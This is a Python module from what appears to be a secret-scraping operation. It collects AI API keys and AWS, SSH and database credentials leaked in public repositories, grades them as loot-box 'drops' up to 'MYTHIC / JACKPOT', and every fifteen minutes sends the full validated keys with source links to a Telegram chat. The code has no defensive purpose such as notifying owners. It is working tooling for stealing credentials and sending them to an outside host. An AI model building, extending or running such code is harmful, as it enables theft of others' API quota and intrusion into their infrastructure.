import io
import json
import httpx
import logging
import asyncio
from datetime import datetime, timezone, timedelta
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MIRROR_MODE

log = logging.getLogger(__name__)

_URL     = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
_DOC_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"

# ── Rarity / drop tier system ──────────────────────────────────────────────
# Every find is graded common → mythic, like a loot box drop:
#   1) provider value     (OpenAI/Anthropic top, owner's own service floor)
#   2) verification state (validated > unverified)
#   3) key format         (sk-proj-/sk-svcacct-/sk-ant-api03- = paid-tier signal)
#   4) infra risk score   (high-risk DB/AWS/SSH = mythic; deploy tokens = common)

_RARITY_TIERS = {
    "mythic":    {"emoji": "🌈", "bar": "🟥🟧🟨🟩🟦🟪", "title": "MYTHIC",    "shout": "JACKPOT"},
    "legendary": {"emoji": "🟧", "bar": "🟧🟧🟧🟧🟧🟧", "title": "LEGENDARY", "shout": "VALID DROP"},
    "epic":      {"emoji": "🟪", "bar": "🟪🟪🟪🟪🟪🟪", "title": "EPIC",      "shout": "high-tier find"},
    "rare":      {"emoji": "🟦", "bar": "🟦🟦🟦🟦🟦🟦", "title": "RARE",      "shout": "solid find"},
    "uncommon":  {"emoji": "🟩", "bar": "🟩🟩🟩🟩🟩🟩", "title": "UNCOMMON",  "shout": "minor find"},
    "common":    {"emoji": "⬜", "bar": "⬜⬜⬜⬜⬜⬜", "title": "COMMON",    "shout": "noise"},
}

_RARITY_ORDER = ["mythic", "legendary", "epic", "rare", "uncommon", "common"]


def _ai_rarity(provider: str, key: str, is_valid: bool) -> str:
    """Drop tier for an AI-provider key find."""
    if is_valid:
        if provider in ("openai", "openai_image", "anthropic"):
            return "mythic"
        if provider in ("ark", "grok"):
            return "mythic"   # Seedance 2.0-standard and Grok — top tier
        if provider == "ark_fast":
            return "legendary"  # 2.0-fast — one tier below standard
        return "legendary"
    if "sk-proj-" in key or "sk-svcacct-" in key or "sk-ant-api03-" in key:
        return "epic"
    if provider in ("openai", "openai_image", "anthropic", "google", "deepseek", "elevenlabs"):
        return "rare"
    if provider in ("ark", "ark_fast", "grok"):
        return "rare"
    if provider in ("happyhorse", "higgsfield", "inworld", "replicate", "fal"):
        return "uncommon"
    return "common"


def _infra_rarity(cred_type: str, risk_level: str, destination: str) -> str:
    """Drop tier for an infra credential find."""
    if risk_level == "high":
        if cred_type in ("aws", "ssh", "database"):
            return "mythic"
        return "legendary"
    if risk_level == "medium":
        if cred_type in ("aws", "ssh"):
            return "epic"
        return "rare"
    if cred_type in ("database", "aws", "ssh") and destination:
        return "uncommon"
    return "common"


# ── Provider / cred-type visual identity ───────────────────────────────────
_PROVIDER_EMOJI = {
    "openai":        "🟢",
    "openai_image":  "🖼️",
    "anthropic":     "🟣",
    "google":        "🔵",
    "deepseek":      "🟡",
    "elevenlabs":    "🟠",
    "ark_fast":      "🚀",   # Seedance 2.0-fast
    "ark":           "🔴",   # Seedance 2.0-standard
    "happyhorse":    "🐴",
    "higgsfield":    "🌌",
    "grok":          "✖️",
    "inworld":       "🗣️",
    "replicate":     "🔁",
    "fal":           "⚗️",
    "kimi":          "🌙",
    "glm":           "💜",
    "kling":         "🎞️",
    "perplexity":    "🔮",
    "huggingface":   "🤗",
    "fireworks":     "🎆",
    "openrouter":    "🔀",
    # 2026-05 additions
    "pixverse":      "🎥",
    "siliconflow":   "🌊",
    "firecrawl":     "🔥",
    "portkey":       "🚪",
    "krea":          "🎭",
    "hedra":         "🎬",
    "wavespeed":     "🌐",
}

_CRED_EMOJI = {
    "database": "🗄️",
    "ssh":      "🔐",
    "aws":      "☁️",
    "alibaba":  "🔶",
    "azure":    "🔷",
    "infra":    "🚀",
}

_RISK_EMOJI = {"high": "🔴", "medium": "🟡", "low": "⚪"}


# ── Unified drop buffer (flushed every 15 min as ONE Telegram document) ────
# Holds both AI keys (kind="ai") and infra creds (kind="infra"). No per-find
# Telegram messages — every drop waits for the next 15-min roulette spin.
_BUFFER: list[dict] = []
_BUFFER_LOCK: asyncio.Lock | None = None


def _lock() -> asyncio.Lock:
    global _BUFFER_LOCK
    if _BUFFER_LOCK is None:
        _BUFFER_LOCK = asyncio.Lock()
    return _BUFFER_LOCK


async def _send(text: str, parse_mode: str = "HTML"):
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            await c.post(_URL, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text[:4096],
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            })
    except Exception as e:
        log.error("telegram send err: %s", e)


# ── Per-find: buffer only, no immediate send ───────────────────────────────

async def notify_found(provider: str, key: str, repo: str, file_path: str,
                       file_url: str, stars: int, created_at: str,
                       file_type: str, is_valid: bool):
    """Buffer an AI-key drop for the next 15-min roulette flush.
    Only validated keys make it into the report — unverified findings are
    still saved to DB and visible at the / web UI, but Telegram noise is
    reserved for keys we've confirmed actually work + have quota."""
    if MIRROR_MODE:
        # Satellite service — Telegram lives on master. mirror_relay handles
        # shipping the find to master where notification will fire.
        return
    if not is_valid:
        return
    rarity = _ai_rarity(provider, key, is_valid)
    async with _lock():
        _BUFFER.append({
            "kind":      "ai",
            "rarity":    rarity,
            "is_valid":  True,
            "provider":  provider,
            "key":       key,
            "repo":      repo,
            "stars":     stars,
            "file_path": file_path,
            "file_url":  file_url,
            "file_type": file_type,
            "age":       created_at[:10] if created_at else "unknown",
        })


async def notify_infra_found(cred_type: str, cred: str, repo: str,
                              file_path: str, file_url: str,
                              stars: int, created_at: str, file_type: str,
                              destination: str, risk_level: str,
                              risk_reasons: list[str]):
    """Buffer an infra-cred drop for the next 15-min roulette flush.
    Low-risk findings are still skipped (DB-only) — match prior behavior."""
    if risk_level == "low":
        return
    rarity  = _infra_rarity(cred_type, risk_level, destination)
    preview = cred[:25] + "..." + cred[-10:] if len(cred) > 35 else cred[:20] + "..."
    async with _lock():
        _BUFFER.append({
            "kind":         "infra",
            "rarity":       rarity,
            "cred_type":    cred_type,
            "preview":      preview,
            "destination":  destination or "",
            "risk_level":   risk_level,
            "risk_reasons": list(risk_reasons or []),
            "repo":         repo,
            "stars":        stars,
            "file_path":    file_path,
            "file_url":     file_url,
            "file_type":    file_type,
            "age":          created_at[:10] if created_at else "unknown",
        })


# ── 15-min unified roulette flush ──────────────────────────────────────────

async def flush_unverified_buffer() -> int:
    """
    Send buffered drops (AI + infra) as Telegram document(s) with a
    rarity-breakdown caption (mythic → common). Splits into multiple files
    of CHUNK rows so nothing is silently dropped. Clears buffer.
    """
    async with _lock():
        if not _BUFFER:
            return 0
        data = list(_BUFFER)
        _BUFFER.clear()

    by_rarity: dict[str, list] = {}
    for r in data:
        by_rarity.setdefault(r["rarity"], []).append(r)

    n_ai    = sum(1 for r in data if r["kind"] == "ai")
    n_infra = sum(1 for r in data if r["kind"] == "infra")
    n_valid = sum(1 for r in data if r["kind"] == "ai" and r.get("is_valid"))

    # Sort all rows mythic → common; first chunk has the juiciest finds
    all_rows: list[dict] = []
    for rarity in _RARITY_ORDER:
        all_rows.extend(by_rarity.get(rarity, []))

    CHUNK = 200
    chunks = [all_rows[i: i + CHUNK] for i in range(0, len(all_rows), CHUNK)]
    total_files = len(chunks)
    tiers_present = [t for t in _RARITY_ORDER if t in by_rarity]

    # Caption: same on every chunk so each file shows the full breakdown
    cap_lines = [
        f"🎰 <b>Roulette batch</b> — {len(data)} drops",
        f"🤖 AI: {n_ai} ({n_valid} ✅ valid)  |  🏗️ Infra: {n_infra}",
    ]
    for rarity in _RARITY_ORDER:
        if rarity not in by_rarity:
            continue
        t = _RARITY_TIERS[rarity]
        cap_lines.append(f"{t['emoji']} <b>{t['title']}</b>: {len(by_rarity[rarity])}")
    base_caption = "\n".join(cap_lines)

    try:
        async with httpx.AsyncClient(timeout=30) as c:
            for idx, chunk in enumerate(chunks, 1):
                # Group THIS chunk: rarity → source_label → list
                #   AI:    "🟢 OPENAI"
                #   Infra: "☁️ AWS [🔴HIGH]"
                chunk_groups: dict[str, dict[str, list]] = {}
                for r in chunk:
                    rar = r["rarity"]
                    if r["kind"] == "ai":
                        src = f"{_PROVIDER_EMOJI.get(r['provider'], '🔑')} {r['provider'].upper()}"
                    else:
                        risk_e = _RISK_EMOJI.get(r["risk_level"], "⚪")
                        src = (f"{_CRED_EMOJI.get(r['cred_type'], '🔑')} "
                               f"{r['cred_type'].upper()} [{risk_e}{r['risk_level'].upper()}]")
                    chunk_groups.setdefault(rar, {}).setdefault(src, []).append(r)

                now_str  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
                part_hdr = f" — part {idx}/{total_files}" if total_files > 1 else ""

                lines = [
                    "╔══════════════════════════════════════════════════════════════════════╗",
                    f"║  🎰 ROULETTE BATCH — {now_str}{part_hdr}",
                    f"║  Total batch: {len(data)} drops  |  This file: {len(chunk)}",
                    f"║  🤖 AI: {n_ai} ({n_valid} verified)  |  🏗️ Infra: {n_infra}  |  Tiers: {len(tiers_present)}/6",
                    "╠══════════════════════════════════════════════════════════════════════╣",
                ]
                # Histogram (full batch, not just this chunk)
                for rarity in _RARITY_ORDER:
                    n   = len(by_rarity.get(rarity, []))
                    t   = _RARITY_TIERS[rarity]
                    bar = "█" * min(n, 40) if n else "·"
                    lines.append(f"║  {t['emoji']} {t['title']:<10} {n:>4}  {bar}")
                lines.append("╚══════════════════════════════════════════════════════════════════════╝")

                # Per-tier sections (only tiers in this chunk)
                for rarity in _RARITY_ORDER:
                    if rarity not in chunk_groups:
                        continue
                    tier         = _RARITY_TIERS[rarity]
                    bar          = tier["bar"]
                    rows_in_tier = sum(len(v) for v in chunk_groups[rarity].values())
                    lines.append("")
                    lines.append(f"{bar}{bar}")
                    lines.append(f"  {tier['emoji']} {tier['title']} TIER — {rows_in_tier} drops")
                    lines.append(f"{bar}{bar}")

                    for src in sorted(chunk_groups[rarity]):
                        src_rows = chunk_groups[rarity][src]
                        lines.append("")
                        lines.append(f"  {src} ({len(src_rows)})")
                        lines.append(f"  {'─' * 64}")
                        for r in src_rows:
                            if r["kind"] == "ai":
                                badge = "✅ VALID " if r.get("is_valid") else "         "
                                lines.append(
                                    f"    {badge} {r['key']}\n"
                                    f"      repo: {r['repo']}  ⭐{r['stars']}  type: {r['file_type']}\n"
                                    f"      {r['file_url']}"
                                )
                            else:
                                dest    = f"  →  {r['destination']}" if r['destination'] else ""
                                reasons = ", ".join(r["risk_reasons"][:3]) or "—"
                                lines.append(
                                    f"    {r['preview']}{dest}\n"
                                    f"      repo: {r['repo']}  ⭐{r['stars']}  type: {r['file_type']}\n"
                                    f"      risk: {reasons}\n"
                                    f"      {r['file_url']}"
                                )

                content = "\n".join(lines).encode("utf-8")
                caption = (base_caption + (f"\n\n📎 Part {idx}/{total_files}"
                                           if total_files > 1 else ""))[:1024]
                fname   = f"roulette_{idx}.txt" if total_files > 1 else "roulette.txt"

                await c.post(
                    _DOC_URL,
                    data={
                        "chat_id":    TELEGRAM_CHAT_ID,
                        "caption":    caption,
                        "parse_mode": "HTML",
                    },
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
    except Exception as e:
        log.error("flush buffer err: %s", e)
        # Restore buffer so the batch is retried next cycle instead of silently dropped
        async with _lock():
            _BUFFER[:0] = data
        return 0

    return len(data)


# ── Periodic summaries (not per-find, fired by their own schedules) ────────

async def notify_cycle_done(stats: dict):
    by_prov = stats.get("by_provider", [])
    lines = [
        "🔄 <b>Scan cycle done</b>",
        f"📦 Repos: {stats['repos_scanned']}  |  📄 Files: {stats['files_scanned']}",
        f"🔑 Found: <b>{stats['keys_found']}</b>  |  ✅ Valid: <b>{stats['keys_valid']}</b>",
    ]
    if by_prov:
        lines.append("")
        lines.append("<b>By provider (all-time):</b>")
        for row in by_prov:
            e = _PROVIDER_EMOJI.get(row["provider"], "🔑")
            lines.append(f"{e} {row['provider'].upper()}: {row['total']} found, {row['valid']} valid")
    await _send("\n".join(lines))


async def notify_hourly_digest(by_provider: list[dict], total_new: int,
                               total_valid: int, new_valid_keys: list[dict]):
    """Hourly summary — only sent if at least 1 new key was found."""
    if total_new == 0:
        return

    now_str = datetime.now(timezone.utc).strftime("%H:%M UTC")
    lines = [
        f"🕐 <b>Hourly digest @ {now_str}</b>",
        f"New this hour: <b>{total_new}</b>  |  ✅ Valid: <b>{total_valid}</b>",
        "",
        "<b>By provider:</b>",
    ]
    for row in by_provider:
        e     = _PROVIDER_EMOJI.get(row["provider"], "🔑")
        prov  = row["provider"].upper()
        cnt   = row["cnt"]
        v     = row["valid_cnt"]
        badge = " ✅" if v > 0 else ""
        lines.append(f"{e} {prov}: {cnt} new, {v} valid{badge}")

    if new_valid_keys:
        lines.append("")
        lines.append("🌈 <b>Fresh valid drops:</b>")
        for k in new_valid_keys[:5]:
            e = _PROVIDER_EMOJI.get(k["provider"], "🔑")
            lines.append(
                f"{e} {k['provider'].upper()} — <code>{k['key_preview']}</code>\n"
                f"    <a href='https://github.com/{k['repo']}'>{k['repo']}</a>"
            )

    await _send("\n".join(lines))


async def notify_dead_token(token_preview: str):
    """Alert when a token returns 401. token_preview may be 'platform:hash' or bare hash."""
    _PREFIX_MAP = {
        "codeberg:":  ("CODEBERG",  "CODEBERG_TOKENS"),
        "gitee:":     ("GITEE",     "GITEE_TOKENS"),
        "bitbucket:": ("BITBUCKET", "BITBUCKET_TOKENS"),
        "postman:":   ("POSTMAN",   "POSTMAN_TOKENS"),
        "kaggle:":    ("KAGGLE",    "KAGGLE_TOKENS"),
        "hf:":        ("HUGGINGFACE", "HF_TOKEN"),
    }
    platform, env_var = "GITHUB", "GITHUB_TOKENS"
    for prefix, (p, e) in _PREFIX_MAP.items():
        if token_preview.startswith(prefix):
            platform, env_var = p, e
            break
    await _send(
        f"💀 <b>{platform} TOKEN DEAD</b>\n"
        f"Token <code>{token_preview}...</code> returned 401.\n"
        f"Worker skipped — update <code>{env_var}</code> on Railway."
    )


async def notify_infra_hourly(by_type: list[dict], total: int, high: int):
    if total == 0:
        return
    lines = [f"🏗️ <b>Infra credentials this hour: {total}</b> ({high} high-risk)"]
    for row in by_type:
        e     = _CRED_EMOJI.get(row["cred_type"], "🔑")
        hc    = row.get("high_cnt", 0)
        badge = " 🔴" if hc > 0 else ""
        lines.append(f"{e} {row['cred_type'].upper()}: {row['cnt']}{badge}")
    await _send("\n".join(lines))
